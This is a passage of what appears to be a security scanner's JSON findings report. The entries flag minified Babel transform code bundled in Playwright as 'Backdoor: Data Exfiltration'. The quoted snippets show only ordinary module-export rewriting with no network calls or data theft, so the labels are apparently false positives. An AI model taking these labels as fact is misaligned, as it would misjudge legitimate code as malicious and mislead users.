                      "markdown": "`t\"(e){let{scope:t,node:r}=e,{left:n}=r,{exported:s,imported:i,scope:a}=this;if(!Wfe(n)){let o=!1,l,u=e.get(\"body\").scope;for(let p of Object.keys(Rfe(n)))a.getBinding(p)===t.getBinding(p)&&(s.has(p)&&(o=!0,u.hasOwnBinding(p)&&u.rename(p)),i.has(p)&&!l&&(l=p));if(!o&&!l)return;e.ensureBlock();let c=e.get(\"body\"),f=t.generateUidIdentifierBasedOnNode(n);e.get(\"left\").replaceWith(Hfe(\"let\",[Yfe(Lo(f))])),t.registerDeclaration(e.get(\"left\")),o&&c.unshiftContainer(\"body\",Ro(bc(\"=\",n,f))),l&&c.unshiftContainer(\"body\",Ro(gc(l)))}}}});var q0=E(ia=>{\"use strict\";Object.defineProperty(ia,\"__esModule\",{value:!`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1639,
                  "startColumn": 2546,
                  "endLine": 1639,
                  "endColumn": 2551,
                  "snippet": {
                    "text": "Ps(p),e.scope))}),f.length>0){let p=Mo(f);e.parentPath.isExpressionStatement()&&(p=Ro(p),p._blockHoist=e.parentPath.node._blockHoist);let m=e.insertAfter(p)[0];i(m)}}}},\"ForOfStatement|ForInStatement\"(e){let{scope:t,node:r}=e,{left:n}=r,{exported:s,imported:i,scope:a}=this;if(!Wfe(n)){let o=!1,l,u=e.get(\"body\").scope;for(let p of Object.keys(Rfe(n)))a.getBinding(p)===t.getBinding(p)&&(s.has(p)&&(o=!0,u.hasOwnBinding(p)&&u.rename(p)),i.has(p)&&!l&&(l=p));if(!o&&!l)return;e.ensureBlock();let c=e.get(\"body\"),f=t.generateUidIdentifierBasedOnNode(n);e.get(\"left\").replaceWith(Hfe(\"let\",[Yfe(Lo(f))])),t.r",
                    "rendered": {
                      "text": "Ps(p),e.scope))}),f.length>0){let p=Mo(f);e.parentPath.isExpressionStatement()&&(p=Ro(p),p._blockHoist=e.parentPath.node._blockHoist);let m=e.insertAfter(p)[0];i(m)}}}},\"ForOfStatement|ForInStatement\"(e){let{scope:t,node:r}=e,{left:n}=r,{exported:s,imported:i,scope:a}=this;if(!Wfe(n)){let o=!1,l,u=e.get(\"body\").scope;for(let p of Object.keys(Rfe(n)))a.getBinding(p)===t.getBinding(p)&&(s.has(p)&&(o=!0,u.hasOwnBinding(p)&&u.rename(p)),i.has(p)&&!l&&(l=p));if(!o&&!l)return;e.ensureBlock();let c=e.get(\"body\"),f=t.generateUidIdentifierBasedOnNode(n);e.get(\"left\").replaceWith(Hfe(\"let\",[Yfe(Lo(f))])),t.r",
                      "markdown": "`Ps(p),e.scope))}),f.length>0){let p=Mo(f);e.parentPath.isExpressionStatement()&&(p=Ro(p),p._blockHoist=e.parentPath.node._blockHoist);let m=e.insertAfter(p)[0];i(m)}}}},\"ForOfStatement|ForInStatement\"(e){let{scope:t,node:r}=e,{left:n}=r,{exported:s,imported:i,scope:a}=this;if(!Wfe(n)){let o=!1,l,u=e.get(\"body\").scope;for(let p of Object.keys(Rfe(n)))a.getBinding(p)===t.getBinding(p)&&(s.has(p)&&(o=!0,u.hasOwnBinding(p)&&u.rename(p)),i.has(p)&&!l&&(l=p));if(!o&&!l)return;e.ensureBlock();let c=e.get(\"body\"),f=t.generateUidIdentifierBasedOnNode(n);e.get(\"left\").replaceWith(Hfe(\"let\",[Yfe(Lo(f))])),t.r`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1639,
                  "startColumn": 2196,
                  "endLine": 1639,
                  "endColumn": 2201,
                  "snippet": {
                    "text": "a(c,o.node),f.right=Mo([f.right,gc(l)])),e.replaceWith(oi(this.metadata,u,f,e.scope)),i(e)}}else{let l=o.getOuterBindingIdentifiers(),u=Object.keys(l).filter(p=>t.getBinding(p)===e.scope.getBinding(p)),c=u.find(p=>n.has(p));c&&(e.node.right=Mo([e.node.right,gc(c)]));let f=[];if(u.forEach(p=>{let m=s.get(p)||[];m.length>0&&f.push(oi(this.metadata,m,Ps(p),e.scope))}),f.length>0){let p=Mo(f);e.parentPath.isExpressionStatement()&&(p=Ro(p),p._blockHoist=e.parentPath.node._blockHoist);let m=e.insertAfter(p)[0];i(m)}}}},\"ForOfStatement|ForInStatement\"(e){let{scope:t,node:r}=e,{left:n}=r,{exported:s,import",
                    "rendered": {
                      "text": "a(c,o.node),f.right=Mo([f.right,gc(l)])),e.replaceWith(oi(this.metadata,u,f,e.scope)),i(e)}}else{let l=o.getOuterBindingIdentifiers(),u=Object.keys(l).filter(p=>t.getBinding(p)===e.scope.getBinding(p)),c=u.find(p=>n.has(p));c&&(e.node.right=Mo([e.node.right,gc(c)]));let f=[];if(u.forEach(p=>{let m=s.get(p)||[];m.length>0&&f.push(oi(this.metadata,m,Ps(p),e.scope))}),f.length>0){let p=Mo(f);e.parentPath.isExpressionStatement()&&(p=Ro(p),p._blockHoist=e.parentPath.node._blockHoist);let m=e.insertAfter(p)[0];i(m)}}}},\"ForOfStatement|ForInStatement\"(e){let{scope:t,node:r}=e,{left:n}=r,{exported:s,import",
                      "markdown": "`a(c,o.node),f.right=Mo([f.right,gc(l)])),e.replaceWith(oi(this.metadata,u,f,e.scope)),i(e)}}else{let l=o.getOuterBindingIdentifiers(),u=Object.keys(l).filter(p=>t.getBinding(p)===e.scope.getBinding(p)),c=u.find(p=>n.has(p));c&&(e.node.right=Mo([e.node.right,gc(c)]));let f=[];if(u.forEach(p=>{let m=s.get(p)||[];m.length>0&&f.push(oi(this.metadata,m,Ps(p),e.scope))}),f.length>0){let p=Mo(f);e.parentPath.isExpressionStatement()&&(p=Ro(p),p._blockHoist=e.parentPath.node._blockHoist);let m=e.insertAfter(p)[0];i(m)}}}},\"ForOfStatement|ForInStatement\"(e){let{scope:t,node:r}=e,{left:n}=r,{exported:s,import`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1639,
                  "startColumn": 1776,
                  "endLine": 1639,
                  "endColumn": 1781,
                  "snippet": {
                    "text": "Expression:{exit(e){let{scope:t,seen:r,imported:n,exported:s,requeueInParent:i,buildImportReference:a}=this;if(r.has(e.node))return;r.add(e.node);let o=e.get(\"left\");if(!o.isMemberExpression())if(o.isIdentifier()){let l=o.node.name;if(t.getBinding(l)!==e.scope.getBinding(l))return;let u=s.get(l),c=n.get(l);if((u==null?void 0:u.length)>0||c){Lfe(e.node.operator===\"=\",\"Path was not simplified\");let f=e.node;c&&(f.left=a(c,o.node),f.right=Mo([f.right,gc(l)])),e.replaceWith(oi(this.metadata,u,f,e.scope)),i(e)}}else{let l=o.getOuterBindingIdentifiers(),u=Object.keys(l).filter(p=>t.getBinding(p)===e.scop",
                    "rendered": {
                      "text": "Expression:{exit(e){let{scope:t,seen:r,imported:n,exported:s,requeueInParent:i,buildImportReference:a}=this;if(r.has(e.node))return;r.add(e.node);let o=e.get(\"left\");if(!o.isMemberExpression())if(o.isIdentifier()){let l=o.node.name;if(t.getBinding(l)!==e.scope.getBinding(l))return;let u=s.get(l),c=n.get(l);if((u==null?void 0:u.length)>0||c){Lfe(e.node.operator===\"=\",\"Path was not simplified\");let f=e.node;c&&(f.left=a(c,o.node),f.right=Mo([f.right,gc(l)])),e.replaceWith(oi(this.metadata,u,f,e.scope)),i(e)}}else{let l=o.getOuterBindingIdentifiers(),u=Object.keys(l).filter(p=>t.getBinding(p)===e.scop",
                      "markdown": "`Expression:{exit(e){let{scope:t,seen:r,imported:n,exported:s,requeueInParent:i,buildImportReference:a}=this;if(r.has(e.node))return;r.add(e.node);let o=e.get(\"left\");if(!o.isMemberExpression())if(o.isIdentifier()){let l=o.node.name;if(t.getBinding(l)!==e.scope.getBinding(l))return;let u=s.get(l),c=n.get(l);if((u==null?void 0:u.length)>0||c){Lfe(e.node.operator===\"=\",\"Path was not simplified\");let f=e.node;c&&(f.left=a(c,o.node),f.right=Mo([f.right,gc(l)])),e.replaceWith(oi(this.metadata,u,f,e.scope)),i(e)}}else{let l=o.getOuterBindingIdentifiers(),u=Object.keys(l).filter(p=>t.getBinding(p)===e.scop`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1639,
                  "startColumn": 1765,
                  "endLine": 1639,
                  "endColumn": 1770,
                  "snippet": {
                    "text": ",AssignmentExpression:{exit(e){let{scope:t,seen:r,imported:n,exported:s,requeueInParent:i,buildImportReference:a}=this;if(r.has(e.node))return;r.add(e.node);let o=e.get(\"left\");if(!o.isMemberExpression())if(o.isIdentifier()){let l=o.node.name;if(t.getBinding(l)!==e.scope.getBinding(l))return;let u=s.get(l),c=n.get(l);if((u==null?void 0:u.length)>0||c){Lfe(e.node.operator===\"=\",\"Path was not simplified\");let f=e.node;c&&(f.left=a(c,o.node),f.right=Mo([f.right,gc(l)])),e.replaceWith(oi(this.metadata,u,f,e.scope)),i(e)}}else{let l=o.getOuterBindingIdentifiers(),u=Object.keys(l).filter(p=>t.getBinding(",
                    "rendered": {
                      "text": ",AssignmentExpression:{exit(e){let{scope:t,seen:r,imported:n,exported:s,requeueInParent:i,buildImportReference:a}=this;if(r.has(e.node))return;r.add(e.node);let o=e.get(\"left\");if(!o.isMemberExpression())if(o.isIdentifier()){let l=o.node.name;if(t.getBinding(l)!==e.scope.getBinding(l))return;let u=s.get(l),c=n.get(l);if((u==null?void 0:u.length)>0||c){Lfe(e.node.operator===\"=\",\"Path was not simplified\");let f=e.node;c&&(f.left=a(c,o.node),f.right=Mo([f.right,gc(l)])),e.replaceWith(oi(this.metadata,u,f,e.scope)),i(e)}}else{let l=o.getOuterBindingIdentifiers(),u=Object.keys(l).filter(p=>t.getBinding(",
                      "markdown": "`,AssignmentExpression:{exit(e){let{scope:t,seen:r,imported:n,exported:s,requeueInParent:i,buildImportReference:a}=this;if(r.has(e.node))return;r.add(e.node);let o=e.get(\"left\");if(!o.isMemberExpression())if(o.isIdentifier()){let l=o.node.name;if(t.getBinding(l)!==e.scope.getBinding(l))return;let u=s.get(l),c=n.get(l);if((u==null?void 0:u.length)>0||c){Lfe(e.node.operator===\"=\",\"Path was not simplified\");let f=e.node;c&&(f.left=a(c,o.node),f.right=Mo([f.right,gc(l)])),e.replaceWith(oi(this.metadata,u,f,e.scope)),i(e)}}else{let l=o.getOuterBindingIdentifiers(),u=Object.keys(l).filter(p=>t.getBinding(`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1639,
                  "startColumn": 1629,
                  "endLine": 1639,
                  "endColumn": 1634,
                  "snippet": {
                    "text": "et p=t.generateDeclaredUidIdentifier(u);e.replaceWith(Mo([bc(\"=\",Lo(p),Lo(l)),oi(this.metadata,c,Ps(u),e.scope),Lo(p)]))}}i(e),e.skip()},AssignmentExpression:{exit(e){let{scope:t,seen:r,imported:n,exported:s,requeueInParent:i,buildImportReference:a}=this;if(r.has(e.node))return;r.add(e.node);let o=e.get(\"left\");if(!o.isMemberExpression())if(o.isIdentifier()){let l=o.node.name;if(t.getBinding(l)!==e.scope.getBinding(l))return;let u=s.get(l),c=n.get(l);if((u==null?void 0:u.length)>0||c){Lfe(e.node.operator===\"=\",\"Path was not simplified\");let f=e.node;c&&(f.left=a(c,o.node),f.right=Mo([f.right,gc(l)]",
                    "rendered": {
                      "text": "et p=t.generateDeclaredUidIdentifier(u);e.replaceWith(Mo([bc(\"=\",Lo(p),Lo(l)),oi(this.metadata,c,Ps(u),e.scope),Lo(p)]))}}i(e),e.skip()},AssignmentExpression:{exit(e){let{scope:t,seen:r,imported:n,exported:s,requeueInParent:i,buildImportReference:a}=this;if(r.has(e.node))return;r.add(e.node);let o=e.get(\"left\");if(!o.isMemberExpression())if(o.isIdentifier()){let l=o.node.name;if(t.getBinding(l)!==e.scope.getBinding(l))return;let u=s.get(l),c=n.get(l);if((u==null?void 0:u.length)>0||c){Lfe(e.node.operator===\"=\",\"Path was not simplified\");let f=e.node;c&&(f.left=a(c,o.node),f.right=Mo([f.right,gc(l)]",
                      "markdown": "`et p=t.generateDeclaredUidIdentifier(u);e.replaceWith(Mo([bc(\"=\",Lo(p),Lo(l)),oi(this.metadata,c,Ps(u),e.scope),Lo(p)]))}}i(e),e.skip()},AssignmentExpression:{exit(e){let{scope:t,seen:r,imported:n,exported:s,requeueInParent:i,buildImportReference:a}=this;if(r.has(e.node))return;r.add(e.node);let o=e.get(\"left\");if(!o.isMemberExpression())if(o.isIdentifier()){let l=o.node.name;if(t.getBinding(l)!==e.scope.getBinding(l))return;let u=s.get(l),c=n.get(l);if((u==null?void 0:u.length)>0||c){Lfe(e.node.operator===\"=\",\"Path was not simplified\");let f=e.node;c&&(f.left=a(c,o.node),f.right=Mo([f.right,gc(l)]`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1639,
                  "startColumn": 1155,
                  "endLine": 1639,
                  "endColumn": 1160,
                  "snippet": {
                    "text": "{scope:t,seen:r,imported:n,exported:s,requeueInParent:i,buildImportReference:a}=this;if(r.has(e.node))return;r.add(e.node);let o=e.get(\"argument\");if(o.isMemberExpression())return;let l=e.node;if(o.isIdentifier()){let u=o.node.name;if(t.getBinding(u)!==e.scope.getBinding(u))return;let c=s.get(u),f=n.get(u);if((c==null?void 0:c.length)>0||f)if(f)e.replaceWith(bc(l.operator[0]+\"=\",a(f,o.node),gc(u)));else if(l.prefix)e.replaceWith(oi(this.metadata,c,Lo(l),e.scope));else{let p=t.generateDeclaredUidIdentifier(u);e.replaceWith(Mo([bc(\"=\",Lo(p),Lo(l)),oi(this.metadata,c,Ps(u),e.scope),Lo(p)]))}}i(e),e.sk",
                    "rendered": {
                      "text": "{scope:t,seen:r,imported:n,exported:s,requeueInParent:i,buildImportReference:a}=this;if(r.has(e.node))return;r.add(e.node);let o=e.get(\"argument\");if(o.isMemberExpression())return;let l=e.node;if(o.isIdentifier()){let u=o.node.name;if(t.getBinding(u)!==e.scope.getBinding(u))return;let c=s.get(u),f=n.get(u);if((c==null?void 0:c.length)>0||f)if(f)e.replaceWith(bc(l.operator[0]+\"=\",a(f,o.node),gc(u)));else if(l.prefix)e.replaceWith(oi(this.metadata,c,Lo(l),e.scope));else{let p=t.generateDeclaredUidIdentifier(u);e.replaceWith(Mo([bc(\"=\",Lo(p),Lo(l)),oi(this.metadata,c,Ps(u),e.scope),Lo(p)]))}}i(e),e.sk",
                      "markdown": "`{scope:t,seen:r,imported:n,exported:s,requeueInParent:i,buildImportReference:a}=this;if(r.has(e.node))return;r.add(e.node);let o=e.get(\"argument\");if(o.isMemberExpression())return;let l=e.node;if(o.isIdentifier()){let u=o.node.name;if(t.getBinding(u)!==e.scope.getBinding(u))return;let c=s.get(u),f=n.get(u);if((c==null?void 0:c.length)>0||f)if(f)e.replaceWith(bc(l.operator[0]+\"=\",a(f,o.node),gc(u)));else if(l.prefix)e.replaceWith(oi(this.metadata,c,Lo(l),e.scope));else{let p=t.generateDeclaredUidIdentifier(u);e.replaceWith(Mo([bc(\"=\",Lo(p),Lo(l)),oi(this.metadata,c,Ps(u),e.scope),Lo(p)]))}}i(e),e.sk`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1639,
                  "startColumn": 1144,
                  "endLine": 1639,
                  "endColumn": 1149,
                  "snippet": {
                    "text": "sion(e){let{scope:t,seen:r,imported:n,exported:s,requeueInParent:i,buildImportReference:a}=this;if(r.has(e.node))return;r.add(e.node);let o=e.get(\"argument\");if(o.isMemberExpression())return;let l=e.node;if(o.isIdentifier()){let u=o.node.name;if(t.getBinding(u)!==e.scope.getBinding(u))return;let c=s.get(u),f=n.get(u);if((c==null?void 0:c.length)>0||f)if(f)e.replaceWith(bc(l.operator[0]+\"=\",a(f,o.node),gc(u)));else if(l.prefix)e.replaceWith(oi(this.metadata,c,Lo(l),e.scope));else{let p=t.generateDeclaredUidIdentifier(u);e.replaceWith(Mo([bc(\"=\",Lo(p),Lo(l)),oi(this.metadata,c,Ps(u),e.scope),Lo(p)]))",
                    "rendered": {
                      "text": "sion(e){let{scope:t,seen:r,imported:n,exported:s,requeueInParent:i,buildImportReference:a}=this;if(r.has(e.node))return;r.add(e.node);let o=e.get(\"argument\");if(o.isMemberExpression())return;let l=e.node;if(o.isIdentifier()){let u=o.node.name;if(t.getBinding(u)!==e.scope.getBinding(u))return;let c=s.get(u),f=n.get(u);if((c==null?void 0:c.length)>0||f)if(f)e.replaceWith(bc(l.operator[0]+\"=\",a(f,o.node),gc(u)));else if(l.prefix)e.replaceWith(oi(this.metadata,c,Lo(l),e.scope));else{let p=t.generateDeclaredUidIdentifier(u);e.replaceWith(Mo([bc(\"=\",Lo(p),Lo(l)),oi(this.metadata,c,Ps(u),e.scope),Lo(p)]))",
                      "markdown": "`sion(e){let{scope:t,seen:r,imported:n,exported:s,requeueInParent:i,buildImportReference:a}=this;if(r.has(e.node))return;r.add(e.node);let o=e.get(\"argument\");if(o.isMemberExpression())return;let l=e.node;if(o.isIdentifier()){let u=o.node.name;if(t.getBinding(u)!==e.scope.getBinding(u))return;let c=s.get(u),f=n.get(u);if((c==null?void 0:c.length)>0||f)if(f)e.replaceWith(bc(l.operator[0]+\"=\",a(f,o.node),gc(u)));else if(l.prefix)e.replaceWith(oi(this.metadata,c,Lo(l),e.scope));else{let p=t.generateDeclaredUidIdentifier(u);e.replaceWith(Mo([bc(\"=\",Lo(p),Lo(l)),oi(this.metadata,c,Ps(u),e.scope),Lo(p)]))`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1639,
                  "startColumn": 985,
                  "endLine": 1639,
                  "endColumn": 990,
                  "snippet": {
                    "text": "]));else if(e.isJSXIdentifier()&&RC(c)){let{object:f,property:p}=c;e.replaceWith(Kfe(qC(f.name),qC(p.name)))}else e.replaceWith(c);i(e),e.skip()}},UpdateExpression(e){let{scope:t,seen:r,imported:n,exported:s,requeueInParent:i,buildImportReference:a}=this;if(r.has(e.node))return;r.add(e.node);let o=e.get(\"argument\");if(o.isMemberExpression())return;let l=e.node;if(o.isIdentifier()){let u=o.node.name;if(t.getBinding(u)!==e.scope.getBinding(u))return;let c=s.get(u),f=n.get(u);if((c==null?void 0:c.length)>0||f)if(f)e.replaceWith(bc(l.operator[0]+\"=\",a(f,o.node),gc(u)));else if(l.prefix)e.replaceWith(oi",
                    "rendered": {
                      "text": "]));else if(e.isJSXIdentifier()&&RC(c)){let{object:f,property:p}=c;e.replaceWith(Kfe(qC(f.name),qC(p.name)))}else e.replaceWith(c);i(e),e.skip()}},UpdateExpression(e){let{scope:t,seen:r,imported:n,exported:s,requeueInParent:i,buildImportReference:a}=this;if(r.has(e.node))return;r.add(e.node);let o=e.get(\"argument\");if(o.isMemberExpression())return;let l=e.node;if(o.isIdentifier()){let u=o.node.name;if(t.getBinding(u)!==e.scope.getBinding(u))return;let c=s.get(u),f=n.get(u);if((c==null?void 0:c.length)>0||f)if(f)e.replaceWith(bc(l.operator[0]+\"=\",a(f,o.node),gc(u)));else if(l.prefix)e.replaceWith(oi",
                      "markdown": "`]));else if(e.isJSXIdentifier()&&RC(c)){let{object:f,property:p}=c;e.replaceWith(Kfe(qC(f.name),qC(p.name)))}else e.replaceWith(c);i(e),e.skip()}},UpdateExpression(e){let{scope:t,seen:r,imported:n,exported:s,requeueInParent:i,buildImportReference:a}=this;if(r.has(e.node))return;r.add(e.node);let o=e.get(\"argument\");if(o.isMemberExpression())return;let l=e.node;if(o.isIdentifier()){let u=o.node.name;if(t.getBinding(u)!==e.scope.getBinding(u))return;let c=s.get(u),f=n.get(u);if((c==null?void 0:c.length)>0||f)if(f)e.replaceWith(bc(l.operator[0]+\"=\",a(f,o.node),gc(u)));else if(l.prefix)e.replaceWith(oi`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1639,
                  "startColumn": 169,
                  "endLine": 1639,
                  "endColumn": 174,
                  "snippet": {
                    "text": "),l),i)},r)},gc=e=>UC.template.expression.ast`\n    (function() {\n      throw new Error('\"' + '${e}' + '\" is read-only.');\n    })()\n  `,Qfe={ReferencedIdentifier(e){let{seen:t,buildImportReference:r,scope:n,imported:s,requeueInParent:i}=this;if(t.has(e.node))return;t.add(e.node);let a=e.node.name,o=s.get(a);if(o){if(Xfe(e))throw e.buildCodeFrameError(`Cannot transform the imported binding \"${a}\" since it's also used in a type annotation. Please strip type annotations using @babel/preset-typescript or @babel/preset-flow.`);let l=e.scope.getBinding(a);if(n.getBinding(a)!==l)return;let c=r(o,e.node);if",
                    "rendered": {
                      "text": "),l),i)},r)},gc=e=>UC.template.expression.ast`\n    (function() {\n      throw new Error('\"' + '${e}' + '\" is read-only.');\n    })()\n  `,Qfe={ReferencedIdentifier(e){let{seen:t,buildImportReference:r,scope:n,imported:s,requeueInParent:i}=this;if(t.has(e.node))return;t.add(e.node);let a=e.node.name,o=s.get(a);if(o){if(Xfe(e))throw e.buildCodeFrameError(`Cannot transform the imported binding \"${a}\" since it's also used in a type annotation. Please strip type annotations using @babel/preset-typescript or @babel/preset-flow.`);let l=e.scope.getBinding(a);if(n.getBinding(a)!==l)return;let c=r(o,e.node);if",
                      "markdown": "`),l),i)},r)},gc=e=>UC.template.expression.ast`\n    (function() {\n      throw new Error('\"' + '${e}' + '\" is read-only.');\n    })()\n  `,Qfe={ReferencedIdentifier(e){let{seen:t,buildImportReference:r,scope:n,imported:s,requeueInParent:i}=this;if(t.has(e.node))return;t.add(e.node);let a=e.node.name,o=s.get(a);if(o){if(Xfe(e))throw e.buildCodeFrameError(`Cannot transform the imported binding \"${a}\" since it's also used in a type annotation. Please strip type annotations using @babel/preset-typescript or @babel/preset-flow.`);let l=e.scope.getBinding(a);if(n.getBinding(a)!==l)return;let c=r(o,e.node);if`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1635,
                  "startColumn": 15164,
                  "endLine": 1635,
                  "endColumn": 15169,
                  "snippet": {
                    "text": "{id:a}=i.node,{init:o}=i.node;if($fe(a)&&r.has(a.name)&&!qfe(o)&&(!Vfe(o)||o.id)&&(!Ufe(o)||o.id)){if(!o){if(s)continue;o=e.scope.buildUndefinedNode()}i.node.init=oi(n,r.get(a.name),o,e.scope),t(i.get(\"init\"))}else for(let l of Object.keys(i.getOuterBindingIdentifiers()))if(r.has(l)){let u=Ro(oi(n,r.get(l),Ps(l),e.scope));u._blockHoist=e.node._blockHoist,t(e.insertAfter(u)[0])}}}},oi=(e,t,r,n)=>{let s=e.exportName;for(let i=n;i!=null;i=i.parent)i.hasOwnBinding(s)&&i.rename(s);return(t||[]).reduce((i,a)=>{let{stringSpecifiers:o}=e,l=o.has(a);return bc(\"=\",VC(Ps(s),l?$C(a):Ps(a),l),i)},r)},gc=e=>UC.t",
                    "rendered": {
                      "text": "{id:a}=i.node,{init:o}=i.node;if($fe(a)&&r.has(a.name)&&!qfe(o)&&(!Vfe(o)||o.id)&&(!Ufe(o)||o.id)){if(!o){if(s)continue;o=e.scope.buildUndefinedNode()}i.node.init=oi(n,r.get(a.name),o,e.scope),t(i.get(\"init\"))}else for(let l of Object.keys(i.getOuterBindingIdentifiers()))if(r.has(l)){let u=Ro(oi(n,r.get(l),Ps(l),e.scope));u._blockHoist=e.node._blockHoist,t(e.insertAfter(u)[0])}}}},oi=(e,t,r,n)=>{let s=e.exportName;for(let i=n;i!=null;i=i.parent)i.hasOwnBinding(s)&&i.rename(s);return(t||[]).reduce((i,a)=>{let{stringSpecifiers:o}=e,l=o.has(a);return bc(\"=\",VC(Ps(s),l?$C(a):Ps(a),l),i)},r)},gc=e=>UC.t",
                      "markdown": "`{id:a}=i.node,{init:o}=i.node;if($fe(a)&&r.has(a.name)&&!qfe(o)&&(!Vfe(o)||o.id)&&(!Ufe(o)||o.id)){if(!o){if(s)continue;o=e.scope.buildUndefinedNode()}i.node.init=oi(n,r.get(a.name),o,e.scope),t(i.get(\"init\"))}else for(let l of Object.keys(i.getOuterBindingIdentifiers()))if(r.has(l)){let u=Ro(oi(n,r.get(l),Ps(l),e.scope));u._blockHoist=e.node._blockHoist,t(e.insertAfter(u)[0])}}}},oi=(e,t,r,n)=>{let s=e.exportName;for(let i=n;i!=null;i=i.parent)i.hasOwnBinding(s)&&i.rename(s);return(t||[]).reduce((i,a)=>{let{stringSpecifiers:o}=e,l=o.has(a);return bc(\"=\",VC(Ps(s),l?$C(a):Ps(a),l),i)},r)},gc=e=>UC.t`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1635,
                  "startColumn": 15060,
                  "endLine": 1635,
                  "endColumn": 15065,
                  "snippet": {
